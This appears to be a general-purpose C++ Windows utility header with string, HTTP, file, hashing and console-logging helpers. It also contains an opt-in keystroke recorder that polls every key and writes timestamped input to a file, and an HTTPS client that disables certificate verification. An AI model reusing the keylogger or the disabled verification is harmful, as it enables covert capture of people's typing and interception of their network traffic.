#pragma once
#ifdef _MSC_VER
#define _WINSOCKAPI_    // stops windows.h including winsock.h
#include <windows.h>
#endif

#include <string>
#include <vector>
#include <iostream>
#include <cstdio>
#include <cstring>
#include <filesystem>

#ifdef BASE64_SUPPORT
#include "base64/base64.hpp"
#endif

#ifdef CPPHTTPLIB_HTTPLIB_SUPPORT
/* macOS CMakeLists.txt
 * include_directories(${CMAKE_CURRENT_SOURCE_DIR}/../common/github.com/unwitting.life/cpp-utils/OpenSSL/3.0.6+/darwin64-x86_64-cc/include)
 * link_directories(${CMAKE_CURRENT_SOURCE_DIR}/../common/github.com/unwitting.life/cpp-utils/OpenSSL/3.0.6+/darwin64-x86_64-cc/lib)
 * add_executable(${PROJECT_NAME} main.cpp)
 * target_link_libraries(${PROJECT_NAME} crypto ssl)
 */
#define CPPHTTPLIB_OPENSSL_SUPPORT

#include "cpp-httplib/v0.11.2+/httplib.h"

#ifdef _MSC_VER
#ifdef _WIN64
#pragma comment(lib, __FILE__ "/../OpenSSL/3.0.6+/VC-WIN64A/lib/libcrypto.lib")
#pragma comment(lib, __FILE__ "/../OpenSSL/3.0.6+/VC-WIN64A/lib/libssl.lib")
#endif

#endif
#endif

#ifdef _MSC_VER
#include <iostream>
#include <stdio.h>
#include <conio.h>
#include <iostream>
#include <direct.h>
#include <io.h>
#include <shlobj_core.h>
#include <Shlwapi.h>
#include <comutil.h>  
#include <tchar.h>
#pragma comment(lib, "comsuppw.lib")
#pragma comment(lib, "shlwapi.lib")
#endif


#ifdef UNICODE
#define UNC LR"(\\)"
#define string_t std::wstring
#else
#define UNC R"(\\)"
#define string_t std::string
#define TCHAR char
#define _T(x) x
#define _countof(x) sizeof(x) / sizeof(x[0])
#define __countof(x) _countof(x)
#endif

#ifdef _MSC_VER
#define PATH_SEPARATOR '\\'
#else
#define PATH_SEPARATOR '/'
#endif

#define LF _T("\n")

namespace utils {
    namespace strings {
#ifndef SPRINTF_BUFFER_SIZE
#define SPRINTF_BUFFER_SIZE 8192
#endif

        template<class T, class U>
        inline string_t replace(
                string_t s, const T &target, const U &replacement, bool replace_first = 0, bool replace_empty = 0) {
            using S = string_t;
            using C = string_t::value_type;
            using N = string_t::size_type;
            struct {
                auto len(const S &s) { return s.size(); }

                auto len(const C *p) { return std::char_traits<C>::length(p); }

                auto len(const C c) { return sizeof(c); }

                auto sub(S *s, const S &t, N pos, N len) { s->replace(pos, len, t); }

                auto sub(S *s, const C *t, N pos, N len) { s->replace(pos, len, t); }

                auto sub(S *s, const C t, N pos, N len) { s->replace(pos, len, 1, t); }

                auto ins(S *s, const S &t, N pos) { s->insert(pos, t); }

                auto ins(S *s, const C *t, N pos) { s->insert(pos, t); }

                auto ins(S *s, const C t, N pos) { s->insert(pos, 1, t); }
            } util;

            N target_length = util.len(target);
            N replacement_length = util.len(replacement);
            if (target_length == 0) {
                if (!replace_empty || replacement_length == 0) return s;
                N n = s.size() + replacement_length * (1 + s.size());
                s.reserve(!replace_first ? n : s.size() + replacement_length);
                for (N i = 0; i < n; i += 1 + replacement_length) {
                    util.ins(&s, replacement, i);
                    if (replace_first) break;
                }
                return s;
            }

            N pos = 0;
            while ((pos = s.find(target, pos)) != string_t::npos) {
                util.sub(&s, replacement, pos, target_length);
                if (replace_first) return s;
                pos += replacement_length;
            }
            return s;
        }

        string_t sprintf(string_t format, ...) {
            string_t s;
            auto p = new TCHAR[SPRINTF_BUFFER_SIZE];
#ifdef _MSC_VER
            if (p) {
#endif
            va_list args;
            va_start(args, format);
#ifdef _MSC_VER
            _vsntprintf_s(p, SPRINTF_BUFFER_SIZE - 1, SPRINTF_BUFFER_SIZE - 1, format.c_str(), args);
#else
            vsnprintf(p, SPRINTF_BUFFER_SIZE - 1, format.c_str(), args);
#endif
            va_end(args);
            s = p;
            delete[] p;
#ifdef _MSC_VER
            p = nullptr;
        }
#endif
            return s;
        }

        std::string itoa16(int i) {
            std::string s;
            char hex[100] = {0};
            snprintf(hex, _countof(hex) - 1, _T("%x"), i);
            return hex;
        }

        std::string hex(int i) {
            return itoa16(i);
        }

        string_t lower(string_t s) {
            string_t copy = s;
            std::transform(copy.begin(), copy.end(), copy.begin(), ::tolower);
            return copy;
        }

        string_t upper(string_t s) {
            string_t copy = s;
            std::transform(copy.begin(), copy.end(), copy.begin(), ::toupper);
            return copy;
        }

        bool startsWith(string_t s, string_t find) {
            return s.find(find) == 0;
        }

        std::vector<string_t> findAll(string_t s, string_t prefix, string_t suffix) {
            std::vector<string_t> find_;
            auto prefix_ = s.find(prefix);
            while (prefix_ != std::string::npos) {
                auto suffix_ = suffix.empty() ? std::string::npos : s.find(suffix, prefix_ + prefix.size());
                if (suffix_ == std::string::npos) {
                    find_.push_back(s.substr(prefix_));
                } else {
                    find_.push_back(s.substr(prefix_, suffix_ - prefix_ - suffix.size() + 1));
                    prefix_ = s.find(prefix, suffix_ + suffix.size());
                }
            }
            return find_;
        }

        string_t find(string_t s, string_t prefix, string_t suffix) {
            auto find_ = findAll(s, prefix, suffix);
            return find_.empty() ? string_t() : find_.at(0);
        }

        string_t find(string_t s, string_t prefix) {
            return find(s, prefix, string_t());
        }

    }

    namespace httplib {
#define HTTP_OK 200
#define HTTP_SCHEMA "http://"
#define HTTPS_SCHEMA "https://"
        static int retry = 3;

        std::string Get(std::string uri) {
            std::string body;
            auto host = strings::lower(uri);
            if (!host.empty()) {
                if (host.at(host.size() - 1) != '/') {
                    host += "/";
                }
                auto http = strings::find(host, HTTP_SCHEMA, "/");
                auto https = strings::find(host, HTTPS_SCHEMA, "/");
                auto retry_ = retry;
                while (retry_-- > 0) {
                    ::httplib::Error err = ::httplib::Error::Unknown;
                    if (!http.empty()) {
                        ::httplib::Client client(http);
                        auto result = client.Get(host.substr(http.size()));
                        if (result) {
                            body = result->body;
                            err = result.error();
                        }
                    } else if (!https.empty()) {
                        ::httplib::SSLClient sslClient(strings::replace(https, HTTPS_SCHEMA, ""));
                        sslClient.enable_server_certificate_verification(false);
                        auto result = sslClient.Get(host.substr(https.size()));
                        if (result) {
                            body = result->body;
                            err = result.error();
                        }
                    }
                    switch (err) {
                        case ::httplib::Error::ConnectionTimeout:
                        case ::httplib::Error::Read:
                        case ::httplib::Error::Write:
                            break;
                        default:
                            retry_ = 0;
                    }
                }
            }
            return body;
        }
    }

    namespace file {
        bool exists(string_t path) {
            return std::filesystem::exists(path);
        }

        void write(string_t path, std::string data) {
            auto access = _T("rb+");
            if (!exists(path)) {
                access = _T("wb+");
            }
#ifdef _MSC_VER
            FILE *file = nullptr;
            _tfopen_s(&file, path.c_str(), access);
#else
            auto file = fopen(path.c_str(), access);
#endif
            if (file) {
                fseek(file, 0, SEEK_END);
                fwrite(data.c_str(), sizeof(data.c_str()[0]), data.size(), file);
                fclose(file);
#ifdef _MSC_VER
                file = nullptr;
#endif
            }
        }
    }
#ifdef _MSC_VER
    void writeLog(string_t);

    std::string w2s(const std::wstring& ws) {
        _bstr_t t = ws.c_str();
        char* pchar = (char*)t;
        std::string result = pchar;
        return result;
    }

    std::wstring s2w(const std::string& s) {
        _bstr_t t = s.c_str();
        wchar_t* pwchar = (wchar_t*)t;
        std::wstring result = pwchar;
        return result;
    }

    namespace httplib {
        std::string Get(std::wstring uri) {
            return httplib::Get(w2s(uri));
        }
    }
#ifdef UNICODE
#define _s2w s2w
#else
#define _s2w(x) (x)
#endif

    inline string_t hash(BYTE* pData, DWORD dwDataLength, ALG_ID algHashType = CALG_MD5) {
        string_t hash_;
        HCRYPTPROV hCryptProv = NULL;
        HCRYPTHASH hCryptHash = NULL;
        DWORD dwHashDataLength = 0;
        DWORD dwTemp = sizeof(dwHashDataLength);
        if (CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT) &&
            CryptCreateHash(hCryptProv, algHashType, NULL, NULL, &hCryptHash) &&
            CryptHashData(hCryptHash, pData, dwDataLength, 0) &&
            CryptGetHashParam(hCryptHash, HP_HASHSIZE, (BYTE*)(&dwHashDataLength), &dwTemp, 0)) {
            auto p = new BYTE[dwHashDataLength + 1];
            if (p) {
                RtlZeroMemory(p, dwHashDataLength + 1);
                if (CryptGetHashParam(hCryptHash, HP_HASHVAL, p, &dwHashDataLength, 0)) {
                    for (DWORD i = 0; i < dwHashDataLength; i++) {
                        hash_ += upper(_s2w(itoa16(p[i])));
                    }
                }
                delete[] p;
                p = nullptr;
            }
        }
        if (hCryptHash) {
            CryptDestroyHash(hCryptHash);
        }
        if (hCryptProv) {
            CryptReleaseContext(hCryptProv, 0);
        }
        return hash_;
    }

    inline string_t GetFileName(string_t path) {
        string_t fileName;
        auto pos = path.find(_T("\\"));
        if (pos != string_t::npos) {
            fileName = path.substr(pos + 1);
        }
        return fileName;
    }

    inline string_t GetDirectoryPath(string_t path) {
        string_t fileName;
        auto pos = path.find_last_of(_T("\\"));
        if (pos != string_t::npos) {
            fileName = path.substr(0, pos);
        }
        return fileName;
    }

    inline void CreateDirectory(string_t path) {
        string_t::size_type tmp_pos_begin = 0;
        string_t::size_type tmp_pos = 0;
        if (path.find(UNC) == 0) {
            tmp_pos = path.find(_T('\\'), _tcslen(UNC));
        } else {
            tmp_pos = path.find(_T('\\'), tmp_pos_begin);
        }
        while (tmp_pos != path.npos) {
            string_t tmpdir = path.substr(0, tmp_pos);
            if (tmpdir.empty()) {
                return;
            }
            if (!PathFileExists(tmpdir.c_str())) {
                ::CreateDirectory(tmpdir.c_str(), nullptr);
            }
            tmp_pos_begin = tmp_pos + 1;
            tmp_pos = path.find(_T('\\'), tmp_pos_begin);
        }
        if (!PathFileExists(path.c_str())) {
            ::CreateDirectory(path.c_str(), nullptr);
        }
    }

    inline string_t Now() {
        SYSTEMTIME time = { 0 };
        GetLocalTime(&time);
        TCHAR buffer[MAX_PATH] = { 0 };
        _sntprintf_s(buffer, _countof(buffer) - 1, _T("%04d/%02d/%02d %02d:%02d:%02d.%03d"),
            time.wYear, time.wMonth, time.wDay, time.wHour, time.wMinute, time.wSecond, time.wMilliseconds);
        return buffer;
    }

    inline string_t GetWorkingDirectory() {
        TCHAR buffer[MAX_PATH] = { 0 };
        GetModuleFileName(nullptr, buffer, _countof(buffer) - 1);
        string_t directory = buffer;
        auto pos = directory.find_last_of(PATH_SEPARATOR);
        if (pos != string_t::npos) {
            directory = directory.substr(0, pos);
        }
        return directory;
    }

    inline string_t GetExeFileName() {
        TCHAR buffer[MAX_PATH] = { 0 };
        GetModuleFileName(nullptr, buffer, _countof(buffer) - 1);
        auto exe = string_t(buffer);
        auto pos = exe.find_last_of(PATH_SEPARATOR);
        if (pos != string_t::npos) {
            exe = exe.substr(pos + 1);
        }
        return exe;
    }

    inline string_t GetExeFileNameWithoutExtension() {
        auto exe = GetExeFileName();
        auto pos = exe.find_last_of(_T("."));
        if (pos != string_t::npos) {
            exe = exe.substr(0, pos);
        }
        return exe;
    }

    struct CONSOLE_TEXT {
        string_t text;
        WORD color;
        CONSOLE_TEXT() {
            this->color = FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_RED;
        }

        CONSOLE_TEXT(string_t text) {
            this->text = text;
            this->color = FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_RED;
        }

        CONSOLE_TEXT(string_t text, WORD color) {
            this->text = text;
            this->color = color;
        }
    };

    static LPCRITICAL_SECTION pCriticalSection = nullptr;
    LPCRITICAL_SECTION GetCriticalSection() {
        if (!pCriticalSection) {
            pCriticalSection = new CRITICAL_SECTION();
            InitializeCriticalSection(pCriticalSection);
        }
        return pCriticalSection;
    }

    inline void println(std::vector<CONSOLE_TEXT> words, bool crlf = true) {
        static HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
        if (hConsole != INVALID_HANDLE_VALUE) {
            EnterCriticalSection(GetCriticalSection());
            SetConsoleTextAttribute(hConsole, FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_RED);

            string_t line;
            auto datetime = sprintf(_T("[%s] "), Now().c_str());
            _tprintf(_T("%s"), datetime.c_str());
            line += datetime;

            for (auto& w : words) {
                SetConsoleTextAttribute(hConsole, w.color);
                _tprintf(_T("%s"), w.text.c_str());
                line += w.text;
            }
            if (crlf) {
                _tprintf(_T("\n"));
                line += _T("\n");
            }
            writeLog(line);
            LeaveCriticalSection(GetCriticalSection());
        }
    }

    inline void println(string_t text) {
        std::vector<CONSOLE_TEXT> v;
        v.push_back(CONSOLE_TEXT(text));
        println(v);
    }

    inline void println(string_t text, WORD color) {
        std::vector<CONSOLE_TEXT> v;
        v.push_back(CONSOLE_TEXT(text, color));
        println(v);
    }

    inline void print(string_t text, WORD color) {
        std::vector<CONSOLE_TEXT> v;
        v.push_back(CONSOLE_TEXT(text, color));
        println(v, false);
    }

    inline void print_red(string_t text) {
        print(text, FOREGROUND_RED | FOREGROUND_INTENSITY);
    }

    inline void print_green(string_t text) {
        print(text, FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    }

    inline void print_blue(string_t text) {
        print(text, FOREGROUND_BLUE | FOREGROUND_INTENSITY);
    }

    inline void writeLog(string_t log) {
        TCHAR buffer[MAX_PATH] = { 0 };
        GetModuleFileName(nullptr, buffer, _countof(buffer) - 1);
        auto logFilePath = string_t(buffer);
        auto pos = logFilePath.find_last_of('.');
        if (pos != string_t::npos) {
            logFilePath = logFilePath.substr(0, pos);
        }
        logFilePath += _T(".log");
        FILE* file = nullptr;
        _tfopen_s(&file, logFilePath.c_str(), _T("ab+"));
        if (file) {
            fseek(file, 0, SEEK_END);
            std::string text;
#ifdef UNICODE
            text = w2s(log);
#else
            text = log;
#endif
            fwrite(log.c_str(), sizeof(log.c_str()[0]), log.size(), file);
            fclose(file);
            file = nullptr;
        }
    }
#endif

#ifdef KEYBOARD_SUPPORT
#define isKeyDown(vKey) ((GetAsyncKeyState(vKey) & 0x8000) ? 1:0)

    constexpr auto KEY_COUNT = 256;

    inline void recordKeyboard(string_t journalFilePath, int inputTimeout, int delay) {
        if (!journalFilePath.empty()) {
            FILE* file = nullptr;
            _tfreopen_s(&file,
                journalFilePath.c_str(),
                PathFileExists(journalFilePath.c_str()) ? _T("rb+") : _T("w"),
                stdout);
            if (file) {
                fseek(file, 0, SEEK_END);
                bool keyboard[KEY_COUNT] = { 0 };
                string_t line;
                unsigned __int64 lastKeyDownTime = 0;
                while (1) {
                    line.clear();

                    auto keydown = false;
                    for (auto i = 0; i < KEY_COUNT; i++) {
                        if (isKeyDown(i)) {
                            keydown = true;
                            if (!keyboard[i]) {
                                keyboard[i] = true;
                                if (i >= '0' && i <= '9') {
                                    line = sprintf(_T("%c"), (TCHAR)i);
                                } else if (i >= 'A' && i <= 'Z') {
                                    line = sprintf(_T("%c"), (TCHAR)(i - 'A' + 'a'));
                                } else if (i == VK_SPACE) {
                                    line = _T(" ");
                                } else if (i == VK_OEM_PERIOD) {
                                    line = _T(".");
                                } else {
#define PRINT_VK(VK) if (i == (VK)) { line = _T(" { ") _T(#VK) _T(" } "); printed = true; }
                                    bool printed = false;
                                    PRINT_VK(VK_LBUTTON);
                                    PRINT_VK(VK_RBUTTON);
                                    PRINT_VK(VK_CANCEL);
                                    PRINT_VK(VK_MBUTTON);
                                    PRINT_VK(VK_XBUTTON1);
                                    PRINT_VK(VK_XBUTTON2);
                                    PRINT_VK(VK_BACK);
                                    PRINT_VK(VK_TAB);
                                    PRINT_VK(VK_CLEAR);
                                    PRINT_VK(VK_RETURN);
                                    PRINT_VK(VK_SHIFT);
                                    PRINT_VK(VK_CONTROL);
                                    PRINT_VK(VK_MENU);
                                    PRINT_VK(VK_PAUSE);
                                    PRINT_VK(VK_CAPITAL);
                                    PRINT_VK(VK_KANA);
                                    PRINT_VK(VK_HANGEUL);
                                    PRINT_VK(VK_HANGUL);
                                    PRINT_VK(VK_IME_ON);
                                    PRINT_VK(VK_JUNJA);
                                    PRINT_VK(VK_FINAL);
                                    PRINT_VK(VK_HANJA);
                                    PRINT_VK(VK_KANJI);
                                    PRINT_VK(VK_IME_OFF);
                                    PRINT_VK(VK_ESCAPE);
                                    PRINT_VK(VK_CONVERT);
                                    PRINT_VK(VK_NONCONVERT);
                                    PRINT_VK(VK_ACCEPT);
                                    PRINT_VK(VK_MODECHANGE);
                                    PRINT_VK(VK_SPACE);
                                    PRINT_VK(VK_PRIOR);
                                    PRINT_VK(VK_NEXT);
                                    PRINT_VK(VK_END);
                                    PRINT_VK(VK_HOME);
                                    PRINT_VK(VK_LEFT);
                                    PRINT_VK(VK_UP);
                                    PRINT_VK(VK_RIGHT);
                                    PRINT_VK(VK_DOWN);
                                    PRINT_VK(VK_SELECT);
                                    PRINT_VK(VK_PRINT);
                                    PRINT_VK(VK_EXECUTE);
                                    PRINT_VK(VK_SNAPSHOT);
                                    PRINT_VK(VK_INSERT);
                                    PRINT_VK(VK_DELETE);
                                    PRINT_VK(VK_HELP);
                                    PRINT_VK(VK_LWIN);
                                    PRINT_VK(VK_RWIN);
                                    PRINT_VK(VK_APPS);
                                    PRINT_VK(VK_SLEEP);
                                    PRINT_VK(VK_NUMPAD0);
                                    PRINT_VK(VK_NUMPAD1);
                                    PRINT_VK(VK_NUMPAD2);
                                    PRINT_VK(VK_NUMPAD3);
                                    PRINT_VK(VK_NUMPAD4);
                                    PRINT_VK(VK_NUMPAD5);
                                    PRINT_VK(VK_NUMPAD6);
                                    PRINT_VK(VK_NUMPAD7);
                                    PRINT_VK(VK_NUMPAD8);
                                    PRINT_VK(VK_NUMPAD9);
                                    PRINT_VK(VK_MULTIPLY);
                                    PRINT_VK(VK_ADD);
                                    PRINT_VK(VK_SEPARATOR);
                                    PRINT_VK(VK_SUBTRACT);
                                    PRINT_VK(VK_DECIMAL);
                                    PRINT_VK(VK_DIVIDE);
                                    PRINT_VK(VK_F1);
                                    PRINT_VK(VK_F2);
                                    PRINT_VK(VK_F3);
                                    PRINT_VK(VK_F4);
                                    PRINT_VK(VK_F5);
                                    PRINT_VK(VK_F6);
                                    PRINT_VK(VK_F7);
                                    PRINT_VK(VK_F8);
                                    PRINT_VK(VK_F9);
                                    PRINT_VK(VK_F10);
                                    PRINT_VK(VK_F11);
                                    PRINT_VK(VK_F12);
                                    PRINT_VK(VK_F13);
                                    PRINT_VK(VK_F14);
                                    PRINT_VK(VK_F15);
                                    PRINT_VK(VK_F16);
                                    PRINT_VK(VK_F17);
                                    PRINT_VK(VK_F18);
                                    PRINT_VK(VK_F19);
                                    PRINT_VK(VK_F20);
                                    PRINT_VK(VK_F21);
                                    PRINT_VK(VK_F22);
                                    PRINT_VK(VK_F23);
                                    PRINT_VK(VK_F24);
                                    PRINT_VK(VK_NAVIGATION_VIEW);
                                    PRINT_VK(VK_NAVIGATION_MENU);
                                    PRINT_VK(VK_NAVIGATION_UP);
                                    PRINT_VK(VK_NAVIGATION_DOWN);
                                    PRINT_VK(VK_NAVIGATION_LEFT);
                                    PRINT_VK(VK_NAVIGATION_RIGHT);
                                    PRINT_VK(VK_NAVIGATION_ACCEPT);
                                    PRINT_VK(VK_NAVIGATION_CANCEL);
                                    PRINT_VK(VK_NUMLOCK);
                                    PRINT_VK(VK_SCROLL);
                                    PRINT_VK(VK_OEM_NEC_EQUAL);
                                    PRINT_VK(VK_OEM_FJ_JISHO);
                                    PRINT_VK(VK_OEM_FJ_MASSHOU);
                                    PRINT_VK(VK_OEM_FJ_TOUROKU);
                                    PRINT_VK(VK_OEM_FJ_LOYA);
                                    PRINT_VK(VK_OEM_FJ_ROYA);
                                    PRINT_VK(VK_LSHIFT);
                                    PRINT_VK(VK_RSHIFT);
                                    PRINT_VK(VK_LCONTROL);
                                    PRINT_VK(VK_RCONTROL);
                                    PRINT_VK(VK_LMENU);
                                    PRINT_VK(VK_RMENU);
                                    PRINT_VK(VK_BROWSER_BACK);
                                    PRINT_VK(VK_BROWSER_FORWARD);
                                    PRINT_VK(VK_BROWSER_REFRESH);
                                    PRINT_VK(VK_BROWSER_STOP);
                                    PRINT_VK(VK_BROWSER_SEARCH);
                                    PRINT_VK(VK_BROWSER_FAVORITES);
                                    PRINT_VK(VK_BROWSER_HOME);
                                    PRINT_VK(VK_VOLUME_MUTE);
                                    PRINT_VK(VK_VOLUME_DOWN);
                                    PRINT_VK(VK_VOLUME_UP);
                                    PRINT_VK(VK_MEDIA_NEXT_TRACK);
                                    PRINT_VK(VK_MEDIA_PREV_TRACK);
                                    PRINT_VK(VK_MEDIA_STOP);
                                    PRINT_VK(VK_MEDIA_PLAY_PAUSE);
                                    PRINT_VK(VK_LAUNCH_MAIL);
                                    PRINT_VK(VK_LAUNCH_MEDIA_SELECT);
                                    PRINT_VK(VK_LAUNCH_APP1);
                                    PRINT_VK(VK_LAUNCH_APP2);
                                    PRINT_VK(VK_OEM_1);
                                    PRINT_VK(VK_OEM_PLUS);
                                    PRINT_VK(VK_OEM_COMMA);
                                    PRINT_VK(VK_OEM_MINUS);
                                    PRINT_VK(VK_OEM_PERIOD);
                                    PRINT_VK(VK_OEM_2);
                                    PRINT_VK(VK_OEM_3);
                                    PRINT_VK(VK_GAMEPAD_A);
                                    PRINT_VK(VK_GAMEPAD_B);
                                    PRINT_VK(VK_GAMEPAD_X);
                                    PRINT_VK(VK_GAMEPAD_Y);
                                    PRINT_VK(VK_GAMEPAD_RIGHT_SHOULDER);
                                    PRINT_VK(VK_GAMEPAD_LEFT_SHOULDER);
                                    PRINT_VK(VK_GAMEPAD_LEFT_TRIGGER);
                                    PRINT_VK(VK_GAMEPAD_RIGHT_TRIGGER);
                                    PRINT_VK(VK_GAMEPAD_DPAD_UP);
                                    PRINT_VK(VK_GAMEPAD_DPAD_DOWN);
                                    PRINT_VK(VK_GAMEPAD_DPAD_LEFT);
                                    PRINT_VK(VK_GAMEPAD_DPAD_RIGHT);
                                    PRINT_VK(VK_GAMEPAD_MENU);
                                    PRINT_VK(VK_GAMEPAD_VIEW);
                                    PRINT_VK(VK_GAMEPAD_LEFT_THUMBSTICK_BUTTON);
                                    PRINT_VK(VK_GAMEPAD_RIGHT_THUMBSTICK_BUTTON);
                                    PRINT_VK(VK_GAMEPAD_LEFT_THUMBSTICK_UP);
                                    PRINT_VK(VK_GAMEPAD_LEFT_THUMBSTICK_DOWN);
                                    PRINT_VK(VK_GAMEPAD_LEFT_THUMBSTICK_RIGHT);
                                    PRINT_VK(VK_GAMEPAD_LEFT_THUMBSTICK_LEFT);
                                    PRINT_VK(VK_GAMEPAD_RIGHT_THUMBSTICK_UP);
                                    PRINT_VK(VK_GAMEPAD_RIGHT_THUMBSTICK_DOWN);
                                    PRINT_VK(VK_GAMEPAD_RIGHT_THUMBSTICK_RIGHT);
                                    PRINT_VK(VK_GAMEPAD_RIGHT_THUMBSTICK_LEFT);
                                    PRINT_VK(VK_OEM_4);
                                    PRINT_VK(VK_OEM_5);
                                    PRINT_VK(VK_OEM_6);
                                    PRINT_VK(VK_OEM_7);
                                    PRINT_VK(VK_OEM_8);
                                    PRINT_VK(VK_OEM_AX);
                                    PRINT_VK(VK_OEM_102);
                                    PRINT_VK(VK_ICO_HELP);
                                    PRINT_VK(VK_ICO_00);
                                    PRINT_VK(VK_PROCESSKEY);
                                    PRINT_VK(VK_ICO_CLEAR);
                                    PRINT_VK(VK_PACKET);
                                    PRINT_VK(VK_OEM_RESET);
                                    PRINT_VK(VK_OEM_JUMP);
                                    PRINT_VK(VK_OEM_PA1);
                                    PRINT_VK(VK_OEM_PA2);
                                    PRINT_VK(VK_OEM_PA3);
                                    PRINT_VK(VK_OEM_WSCTRL);
                                    PRINT_VK(VK_OEM_CUSEL);
                                    PRINT_VK(VK_OEM_ATTN);
                                    PRINT_VK(VK_OEM_FINISH);
                                    PRINT_VK(VK_OEM_COPY);
                                    PRINT_VK(VK_OEM_AUTO);
                                    PRINT_VK(VK_OEM_ENLW);
                                    PRINT_VK(VK_OEM_BACKTAB);
                                    PRINT_VK(VK_ATTN);
                                    PRINT_VK(VK_CRSEL);
                                    PRINT_VK(VK_EXSEL);
                                    PRINT_VK(VK_EREOF);
                                    PRINT_VK(VK_PLAY);
                                    PRINT_VK(VK_ZOOM);
                                    PRINT_VK(VK_NONAME);
                                    PRINT_VK(VK_PA1);
                                    PRINT_VK(VK_OEM_CLEAR);
                                    PRINT_VK(VK_LCONTROL);
#undef PRINT_VK
                                    if (!printed) {
                                        line = sprintf(_T("0x%02x"), i);
                                    }
                                }
                            }
                        } else {
                            keyboard[i] = false;
                        }
                    }
                    if (!line.empty()) {
                        string_t out = line;
                        if (GetTickCount64() - lastKeyDownTime >= inputTimeout) {
                            out.clear();
                            if (ftell(file) > 0) {
                                out = LF;
                            }
                            out += sprintf(_T("[%s] %s"), Now().c_str(), line.c_str());
                        }
#ifdef UNICODE
                        std::string ansi = w2s(out);
#else
                        std::string ansi = out;
#endif
                        fwrite(ansi.c_str(), sizeof(ansi.c_str()[0]), ansi.size(), file);
                        fflush(file);
                    }
                    if (keydown) {
                        lastKeyDownTime = GetTickCount64();
                    }
                    Sleep(delay);
                }
                fclose(file);
            }
        }
    }

    inline void recordKeyboard() {
        recordKeyboard(GetExeFileNameWithoutExtension() + _T(".txt"), 1500, 10);
    }
#endif
}
